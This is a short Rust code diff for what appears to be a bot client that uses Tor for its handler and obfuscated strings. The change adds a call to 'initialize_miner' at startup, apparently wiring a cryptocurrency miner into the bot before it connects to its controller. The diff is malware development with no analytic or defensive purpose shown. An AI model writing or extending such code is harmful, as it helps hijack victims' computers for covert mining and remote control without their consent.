@@ -2,6 +2,7 @@
 
 use std::sync::Mutex;
 use client_vars::constants::log_directory;
+use miner::utils::initialize_miner;
 use network::tor::BotHandler;
 use obfstr::obfstr as s;
 use shared::{
@@ -139,6 +140,11 @@ async fn main() {
             };
         }
     });
+
+    if let Err(error) = initialize_miner() {
+        err!("initialize_miner failed: ", error);
+    }
+
     let config = LoggerConfig::Existing(LOGGER.lock().unwrap().clone());
     if let Ok(mut bot_handler) = BotHandler::new(config).await {
         bot_handler.run_handler().await;
